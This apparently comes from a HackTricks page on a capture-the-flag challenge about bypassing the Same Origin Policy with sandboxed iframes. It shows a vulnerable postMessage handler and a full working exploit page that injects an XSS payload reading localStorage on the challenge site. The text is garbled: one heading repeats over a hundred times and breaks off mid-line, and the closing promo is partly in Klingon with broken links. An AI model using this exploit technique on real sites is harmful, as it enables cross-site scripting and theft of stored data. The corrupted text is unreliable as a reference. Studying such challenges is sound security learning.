# Bypassing SOP with Iframes - 1

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Iframes in SOP-1

In this [**challenge**](https://github.com/terjanq/same-origin-xss) created by [**NDevTK**](https://github.com/NDevTK) and [**Terjanq**](https://github.com/terjanq) you need you need to exploit a XSS in the coded
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
**SOP bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null)**

**SOP** (Same Origin Policy) **bypass 1 (e.origin === null
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh zero to hero</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **Do you want to see your company advertised in HackTricks**? **or do you want to have access to the latest version of the PEASS or download HackTricks in PDF**? **Check the SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* **Discover The PEASS Family**, **our collection of exclusive NFTs**
* **Get the official PEASS & HackTricks swag**
* **Join the** [üí¨](https://emojipedia.org/speech-balloon/) **Discord group** or the **telegram group** or **follow** me on **Twitter** üê¶[@carlospolopm](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the hacktricks repo and hacktricks-cloud repo**.

</details>
